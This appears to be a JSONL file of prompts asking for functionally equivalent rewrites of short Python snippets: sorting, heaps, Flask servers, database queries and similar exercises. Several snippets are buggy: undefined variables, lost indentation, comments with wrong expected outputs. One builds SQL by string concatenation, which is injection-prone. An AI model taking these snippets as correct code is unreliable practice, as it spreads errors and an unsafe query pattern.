{"prompt": "make some code that functions the same as the following code: import random\n\ndef pso_optimize(cost_func, num_particles, num_iter, min_pos, max_pos):\n    swarm_position = []\n    swarm_velocity = []\n    swarm_cost = []\n\n    for i in range(num_particles):\n        swarm_position.append([random.uniform(min_pos, max_pos) for d in range(len(min_pos))])\n        swarm_velocity.append([0 for d in range(len(min_pos))])\n        swarm_cost.append(cost_func(swarm_position[i]))\n\n    for it in range(num_iter):\n        for i in range(num_particles):\n            swarm_cost[i] = cost_func(swarm_position[i])\n\n            if swarm_cost[i] > swarm[i]['best_cost']:\n                swarm[i]['best_cost'] = swarm_cost[i]\n                swarm[i]['best_position'] = swarm_position[i]\n\n            if swarm_cost[i] > swarm['global_best_cost']:\n                swarm['global_best_cost'] = swarm_cost[i]\n                swarm['global_best_position'] = swarm_position[i]\n\n            for d in range(len(min_pos)):\n                rp = random.randint(0,1)\n                rg = random.randint(0,1)\n                swarm_velocity[i][d] = (swarm_velocity[i][d] \n                    + 2*rp*(swarm[i]['best_position'][d] - swarm_position[i][d])\n                    + 2*rg*(swarm['global_best_position'][d] - swarm_position[i][d]))\n                swarm_position[i][d] = swarm_position[i][d] + swarm_velocity[i][d]\n    return swarm['global_best_position'], swarm['global_best_cost'] but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: class timed_method(object):\n    def __init__(self,func):\n        self.func = func\n        \n    def __call__(self, *args, **kwargs):\n        start_time = time.time()\n        try:\n            result = self.func(*args, **kwargs)\n        except Exception as e:\n            raise e\n        \n        end_time = time.time()\n        print('Total elapsed time for method %s: %2.2f seconds' % (self.func.__name__, end_time - start_time))\n        return result but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def longest_substring(string):\n   # Stores the last occurrence of each character\n   last_occurrence = {}\n   result = [0, 1]\n   start_index = 0\n\n   for i, char in enumerate(string):\n       if char in last_occurrence:\n           start_index = max(start_index, last_occurrence[char] + 1)\n       # We can use result to store the longest substring found so far\n       if result[1] - result[0] < i + 1 - start_index:\n           result = [start_index, i + 1]\n       last_occurrence[char] = i\n\n   return string[result[0]:result[1]]\n\ninput_string = \"abcdbcdab\" \n\n# Print the output \nprint(longest_substring(input_string)) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import numpy as np\nimport tensorflow as tf\n\n# Define the model\nmodel = tf.keras.Sequential()\nmodel.add(tf.keras.layers.Dense(10, input_dim=5, activation='relu'))\nmodel.add(tf.keras.layers.Dense(1, activation='sigmoid'))\n\n# Compile the model\nmodel.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy'])\n\n# Train the model\nmodel.fit(X_train, y_train, epochs=50, batch_size=32, verbose=2)\n\n# Evaluate the model\nscores = model.evaluate(X_test, y_test, verbose=2)\nprint(\"Accuracy: %.2f%%\" % (scores[1]*100)) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def sum_list(l):\n    '''This function returns the sum of all the values in a list'''\n    sum = 0\n    for val in l:\n        sum = sum + val\n    return sum but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def is_palindrome(text):\n    return text == text[::-1] but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: # Python program to classify animals \n\n\nanimals = [\"dog\", \"cat\", \"bird\", \"elephant\"]\nfeatures = [\"bark\", \"meow\", \"tweet\", \"trumpet\"]\n\n# Create a dictionary with key being animal name and value being its feature \nanimal_feature_dict = dict(zip(animals, features))\n\n# Function to classify an animal \ndef classify_animal(animal):\n    # Fetch feature from dict\n    feature = animal_feature_dict[animal]\n\n    # Check for feature\n    if feature == \"bark\":\n        print(\"Animal is a dog.\")\n    elif feature == \"meow\":\n        print(\"Animal is a cat.\")\n    elif feature == \"tweet\":\n        print(\"Animal is a bird.\")\n    elif feature == \"trumpet\":\n        print(\"Animal is an elephant.\")\n    else:\n        print(\"Not able to identify the animal.\")\n\n# Driver program\nclassify_animal(\"dog\")\nclassify_animal(\"cat\")\nclassify_animal(\"bird\")\nclassify_animal(\"elephant\") but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import re\n\ndef spell_check(sentence):\n  words = re.findall(r'\\w+', sentence)\n  for word in words:\n    if not word.lower() in dict:\n        return False\n  return True\n\nsentence = \"This is my new computer\"\nresult = spell_check(sentence)\nif result:\n    print('Correct spelling')\nelse:\n    print('Incorrect spelling') but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import http.server\n\n# Create the server object and set the port\nserver = http.server.HTTPServer(('localhost', 8080), http.server.BaseHTTPRequestHandler)\n\n# Start listening for requests\nserver.serve_forever() but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def count_words(sentence):\n  words = sentence.split()\n  num_words = len(words)\n  total_len = 0\n  for word in words:\n    total_len += len(word)\n  avg_word_len = total_len / num_words\n  return (num_words, avg_word_len) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def parse_html(html):\n    soup = BeautifulSoup(html, 'html.parser')\n    text = soup.get_text()\n    return text but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def closest_pair(list_1, list_2):\n    min_diff = float(\"inf\")\n    \n    for a in list_1:\n        for b in list_2:\n            diff = abs(a - b)\n            if diff < min_diff:\n                min_diff = diff\n                closest_pair = (a, b)\n    \n    return closest_pair but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: from flask import Flask\n\napp = Flask(__name__)\n\n@app.route(\"/posts/<title>/<action>\")\ndef process_url(title: str, action: str):\n\tprint(f'URL endpoint mapping for title: {title} and action: {action}')\n\nif __name__ == '__main__':\n\tapp.run() but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def is_leap_year(year):\n    if year % 400 == 0:\n        return True\n    if year % 100 == 0:\n        return False\n    if year % 4 == 0:\n        return True\n    return False\n\nyear = 1999\nif is_leap_year(year):\n    print(\"This is a leap year.\")\nelse:\n    print(\"This is not a leap year.\") but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import http.server\nimport socketserver\n\nPORT = 8000\n\n#Create an instance of the server\nHandler = http.server.SimpleHTTPRequestHandler\n\n#Enable the server to listen on port 8000\nwith socketserver.TCPServer((\"\", PORT), Handler) as httpd:\n    print(\"serving at port\", PORT)\n    httpd.serve_forever() but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: for i in range(0,21):\n if i == 3 or i == 5 or i == 8:\n  print(i) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def Fahrenheit_to_Celsius(F): \n    return (F - 32) * 5/9\n  \nprint(\"Temperature in Celsius = \", \n      Fahrenheit_to_Celsius(100)) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def sort_array(arr):\n    sorted_arr = sorted(arr) \n    # use the built-in sorted() method \n    return sorted_arr\n\nresult = sort_array([5, 8, 1, 4, 9])\nprint(result) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def binary_to_decimal(binary_num):\n    decimal_num = 0\n    n = 0\n\n    for i in range(len(binary_num)-1, -1, -1):\n        if binary_num[i] == '1':\n            decimal_num += 2**n\n        \n        n += 1\n    \n    return decimal_num but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def multiply(a, b):\n    result = 0\n    while a != 0:\n        if a & 1:\n            result += b\n        a >>= 1\n        b <<= 1\n    return result but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def quick_sort(A):\n  # Base case\n  if len(A) <= 1:\n    return A\n  \n  # Choose pivot\n  pivot_idx = len(A) // 2\n  pivot_val = A[pivot_idx]\n  \n  # Initialize left and right lists\n  left = []\n  right = []\n  \n  # Populate left and right lists\n  for i in range(len(A)):\n    if i == pivot_idx:\n      continue\n    elif A[i] < pivot_val:\n      left.append(A[i])\n    else:\n      right.append(A[i])\n  \n  # Return sorted left and right lists\n  return quick_sort(left) + [pivot_val] + quick_sort(right) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: #import itertools \n  \n# initialize empty list to hold all anagrams \nword_pairs = [] \n  \n# enter the source text  \nsource_text = input(\"Enter the source text: \") \n  \n# split the source text into individual words\nwords = source_text.split() \n  \nfor word1, word2 in itertools.combinations(words,2): \n    if (sorted(word1) == sorted(word2)): \n        word_pairs.append((word1, word2)) \n  \n# print the list of anagram pairs in source text  \nprint(word_pairs) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: class Student:\n    def __init__(self, name, age, marks, roll_number):\n        self.name = name\n        self.age = age\n        self.marks = marks\n        self.roll_number = roll_number\n\n    def get_name(self):\n        return self.name\n\n    def set_name(self, name):\n        self.name = name\n\n    def get_age(self):\n        return self.age\n\n    def set_age(self, age):\n        self.age = age\n\n    def get_marks(self):\n        return self.marks\n\n    def set_marks(self, marks):\n        self.marks = marks\n\n    def get_roll_number(self):\n        return self.roll_number\n\n    def set_roll_number(self, roll_number):\n        self.roll_number = roll_number but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def fibonacci_number(n):\n    if n == 0:\n        return 0\n    elif n == 1:\n        return 1\n    else:\n        return (fibonacci_number(n-1) + fibonacci_number(n-2))\n\nn = int(input(\"Enter the n'th Fibonacci number: \"))\n\nprint(\"Fibonacci number at %d is: %d\" % (n,fibonacci_number(n))) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: class Employee:\n   def __init__(self, name, age, salary):\n      self.name = name\n      self.age = age\n      self.salary = salary but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import requests\nfrom bs4 import BeautifulSoup\n\npage = requests.get(url)\nsoup = BeautifulSoup(page.content, 'html.parser') but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: from textblob import TextBlob\n\ndef sentiment_classifier(sentence):\n  sentiment_score = TextBlob(sentence).sentiment.polarity\n  if sentiment_score > 0:\n    return 'positive'\n  elif sentiment_score < 0:\n    return 'negative'\n  else:\n    return 'neutral' but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def extract_author(title):\n    title_words = title.split()\n    for word in title_words[::-1]:\n        if word[0].isupper():\n            return word\n\nprint(extract_author(title)) # Potter but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: \"\"\"\nCreate a Python decorator that counts the number of times a given \nfunction is called.\n\"\"\"\n\ndef counter_decorator(func):\n    count = 0\n\n    def wrapper(*args, **kwargs):\n        nonlocal count\n        count += 1\n        print(f'{func.__name__} has been called {count} times!')\n        return func(*args, **kwargs)\n\n    return wrapper\n\n@counter_decorator\ndef random_function():\n    pass\n\nif __name__ == '__main__':\n    random_function() # prints \"random_function has been called 1 time!\"\n    random_function() # prints \"random_function has been called 2 time!\" but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: for i in range(10, 0, -1):\n    print(i) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def extract_substring(string):\n  return string[2:5] but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def calculate_area(a,b,c): \n    # calculate the semi-perimeter \n    s = (a + b + c) / 2\n    # calculate the area \n    area = (s*(s-a)*(s-b)*(s-c)) ** 0.5\n    return area \n  \n# Driver code \na = 5\nb = 10\nc = 13\narea = calculate_area(a,b,c) \n  \nprint(\"The area of the triangle is {} cm\".format(area)) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def sieve_of_eratosthenes(n): \n    # Create a boolean array \"prime[0..n]\" and initialize \n    #  all entries it as true. A value in prime[i] will \n    # finally be false if i is Not a prime, else true. \n    prime = [True for i in range(n + 1)] \n    p = 2\n    while (p * p <= n): \n        # If prime[p] is not changed, then it is a prime \n        if (prime[p] == True): \n            # Update all multiples of p \n            for i in range(p * 2, n + 1, p): \n                prime[i] = False\n        p += 1\n  \n    # Print all prime numbers \n    result = []\n    for p in range(2, n): \n        if prime[p]: \n            result.append(p) \n  \n    return result\n\nN = 100\nprint(\"All prime numbers up to\", N, \"are:\")\nprint(sieve_of_eratosthenes(N)) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import mysql.connector\nimport json\n\ndb = mysql.connector.connect(\n host=\"localhost\",\n user=\"yourusername\",\n password=\"yourpassword\",\n database=\"test\"\n)\n\ncursor = db.cursor()\n\nsql = \"SELECT * FROM users\"\n\ncursor.execute(sql)\n\nresults = cursor.fetchall()\n\njson_data = []\n\nfor result in results:\n json_data.append(result)\n\nprint(json.dumps(json_data)) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: class MinHeap: \n    def __init__(self): \n        self.heap = [] \n\n    def __len__(self):\n        return len(self.heap) \n\n    def insert(self, element): \n        self.heap.append(element)\n        self.perc_up(len(self.heap) - 1)\n\n    def extract_min(self): \n        if self.heap[0]: \n            minval = self.heap[0] \n            self.heap[0] = self.heap[-1]\n            del self.heap[-1]\n            self.perc_down(0) \n            return minval \n        else: \n            return False\n  \n    def perc_up(self, index): \n        parent = (index-1)//2 \n        if index <= 0: \n            return\n        elif self.heap[parent] > self.heap[index]: \n            self.swap(parent, index) \n            self.perc_up(parent) \n  \n    def perc_down(self, index): \n        left = (2 * index) + 1 \n        right = (2 * index) + 2 \n        smallest = index \n        if len(self.heap) > left and self.heap[smallest] > self.heap[left]: \n            smallest = left \n        if len(self.heap) > right and self.heap[smallest] > self.heap[right]: \n            smallest = right\n  \n        if smallest != index: \n            self.swap(index, smallest) \n            self.perc_down(smallest) \n  \n    def swap(self, i1, i2): \n        self.heap[i1], self.heap[i2] = self.heap[i2], self.heap[i1] but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def convert_letter_grade(grade):\n    grades = {\n        'A': 4.0,\n        'B': 3.0,\n        'C': 2.0,\n        'D': 1.0\n    }\n    return grades[grade] but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def isIsomorphic(s1, s2): \n        if len(s1) != len(s2): \n            return False\n\n        mapping = {} \n        for i in range(len(s1)): \n            if s1[i] in mapping: \n                if mapping[s1[i]] != s2[i]: \n                    return False\n            else: \n                if s2[i] in mapping.values(): \n                    return False\n                mapping[s1[i]] = s2[i] \n\n        return True\n\ns1 = \"add\"\ns2 = \"egg\"\n\nif(isIsomorphic(s1, s2) == True): \n    print(\"Yes\") \nelse: \n    print(\"No\") but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def array_sum(arr):\n    s = 0\n    for i in arr:\n        s += i\n    return s\n\nprint(array_sum([3,2,1,6,5,7,4])) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: class RoundInstance():\n    def __init__(self, radius, diameter, area, circumference):\n        self.radius = radius\n        self.diameter = diameter\n        self.area = area\n        self.circumference = circumference\n    \n    def get_radius(self):\n        return self.radius\n\n    def get_diameter(self):\n        return self.diameter\n\n    def get_area(self):\n        return self.area\n\n    def get_circumference(self):\n        return self.circumference but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def sort_words(words):\n    words.sort()\n    return words\n\nprint(sort_words([\"blue\", \"red\", \"green\", \"yellow\"])) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import sqlite3\nfrom flask import Flask, render_template\n\napp = Flask(name)\n\nconn = sqlite3.connect('mydatabase.db')\ncursor = conn.cursor()\n\n@app.route('/')\ndef index():\n cursor.execute(\"SELECT * FROM mytable\")\n results = cursor.fetchall()\n return render_template('index.html', results=results)\n\nif name == 'main':\n app.run(debug=True)\n\n// templates/index.html\n<html>\n <head>\n <title>Welcome to my page</title>\n </head>\n <body>\n <h1>My Database Results:</h1>\n <table>\n <tr>\n <th>ID</th>\n <th>Name</th>\n <th>Age</th>\n </tr>\n {% for result in results %}\n <tr>\n <td>{{ result[0] }}</td>\n <td>{{ result[1] }}</td>\n <td>{{ result[2] }}</td>\n </tr>\n {% endfor %}\n </table>\n </body>\n</html> but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import pygame\nfrom pygame.locals import *\nfrom OpenGL.GL import *\nfrom OpenGL.GLU import *\n \n# cube vertices\nvertices = (\n    (1, -1, -1),\n    (1, 1, -1),\n    (-1, 1, -1),\n    (-1, -1, -1),\n    (1, -1, 1),\n    (1, 1, 1),\n    (-1, -1, 1),\n    (-1, 1, 1)\n    )\n \n# cube edges\nedges = (\n    (0,1),\n    (0,3),\n    (0,4),\n    (2,1),\n    (2,3),\n    (2,7),\n    (6,3),\n    (6,4),\n    (6,7),\n    (5,1),\n    (5,4),\n    (5,7)\n    )\n \ndef Cube():\n    glBegin(GL_LINES)\n    for edge in edges:\n        for vertex in edge:\n            glVertex3fv(vertices[vertex])\n    glEnd()\n\ndef main():\n    pygame.init()\n    display = (800,600)\n    pygame.display.set_mode(display, DOUBLEBUF|OPENGL)\n \n    # set viewport\n    gluPerspective(45, (display[0]/display[1]), 0.1, 90.0)\n    glTranslatef(0.0, 0.0, -20)\n \n    # cube rotation\n    glRotatef(45.0, 0.0, 1.0, 0.0)\n    glRotatef(45.0, 1.0, 0.0, 0.0)\n \n    # render the sphere\n    Cube()\n    pygame.display.flip()\n    pygame.time.wait(1000)\n \nif __name__ == '__main__':\n    main() but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def sort_list(lst):\n    return sorted(lst, key = len)\n\nlst = ['Coders', 'NS', 'Coding', 'Program']\n\nresult = sort_list(lst)\n\nprint(result)  # ['NS', 'Coding', 'Coders', 'Program'] but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import random\nimport string\n\ndef generate_list_of_strings(length, count):\n    result = []\n    for _ in range(count):\n        result.append(''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length)))\n    return result\n\nif __name__ == '__main__':\n    strings_list = generate_list_of_strings(8, 10)\n    print(\"Randomly generated strings:\")\n    print(strings_list) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import re\n\ndef replaceConsecutiveVowels(word): \n    regex = re.compile(r'[aeiou]{3,}', re.IGNORECASE) \n    return regex.sub(\"*\", word)\n\nword = \"entertainment\"\n\nprint(replaceConsecutiveVowels(word)) # Output: * but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: print(\"Hello World!\") but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: class InventoryManager:\n    def __init__(self):\n        self.items = []\n\n    def add_item(self, item):\n        self.items.append(item)\n\n    def remove_item(self, item):\n        self.items.remove(item)\n\n    def print_inventory(self):\n        for item in self.items:\n            print(item) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: \"\"\"\nDesign a Python program which can pre-process a given dataset of text for further processing by a machine learning model.\n\"\"\"\n\nimport re\nimport nltk\n\ndef preprocess_text(text):\n     # lower case\n    text = text.lower()\n\n    # remove punctuation\n    text = re.sub(r'[^\\w\\s]', '', text)\n\n    # tokenize\n    tokens = nltk.tokenize.word_tokenize(text)\n\n    # remove stopwords\n    words = [word for word in tokens if not word in nltk.corpus.stopwords.words('english')]\n    \n    # lemmatize\n    lemmatizer = nltk.stem.WordNetLemmatizer()\n    words = [lemmatizer.lemmatize(word) for word in words]\n\n    return words\n\nif __name__ == '__main__':\n    text = 'hello world! My name is John.'\n    preprocessed = preprocess_text(text)\n    print(preprocessed) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import matplotlib.pyplot as plt\n\nx_values = range(-20, 21)\ny_values = [3*x+2 for x in x_values]\n\nplt.plot(x_values, y_values)\nplt.xlabel('x')\nplt.ylabel('y')\nplt.title('y = 3x + 2')\nplt.show() but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: print(\"Hello World!\")\ni=i+1 but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def encode_list_of_strings(list_of_strings):\n  encoded = []\n  for string in list_of_strings:\n    encoded.append(string.encode(\"utf-8\"))\n  return encoded\n\nlist_of_strings = [\"hello\",\"world\",\"how\",\"are\",\"you\"]\nencoded = encode_list_of_strings(list_of_strings)\n\n# Output: [b'hello', b'world', b'how', b'are', b'you'] but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import sqlite3\n\ndef get_table_meta_info(db_name, table_name):\n    conn = sqlite3.connect(db_name)\n    \n    cur = conn.cursor()\n    cur.execute(\"SELECT * FROM \"+ table_name)\n    col_names = [tuple[0] for tuple in cur.description]\n    row_length = len(col_names) \n    \n    cur.execute(\"PRAGMA table_info(\"+ table_name +\")\")\n    table_info = cur.fetchall()\n    \n    data_types = []\n    \n    for row in table_info:\n        data_types.append(row[2])\n        \n    meta_info = {\n            'table_name': table_name,\n            'row_length': row_length,\n            'column_names': col_names,\n            'data_types': data_types\n    }\n    return meta_info but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def word_freq(s):\n \n # Create an empty dictionary\n word_count = {}\n \n # Split the string into a list of words\n words = s.split()\n \n # Loop through each word\n for word in words:\n \n # If the word is already in the dictionary, increment its count\n if word in word_count:\n word_count[word] += 1\n \n # Else, add the word to the dictionary with a count of 1\n else:\n word_count[word] = 1\n \n # Return the dictionary\n return word_count\n \nword_freq('This is a test string to test the function')\n# Output\n# {'This': 1, 'is': 1, 'a': 1, 'test': 2, 'string': 1, 'to': 1, 'function': 1} but is not the same. just give one example and only return the code."}
